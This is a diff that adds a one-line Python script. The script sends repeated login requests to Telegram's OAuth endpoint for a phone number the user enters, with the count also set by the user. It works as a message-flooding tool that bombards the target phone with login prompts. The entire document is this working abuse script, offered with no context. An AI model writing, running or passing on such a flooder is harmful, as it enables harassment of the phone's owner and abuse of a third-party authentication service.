@@ -1,0 +1,1 @@
+import requests;n=input('Number:');[print("Send\n"if requests.post('https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org',data={"phone":"88"+n}).text=='true'else"Error\n")for _ in range(int(input('Amount:')))]
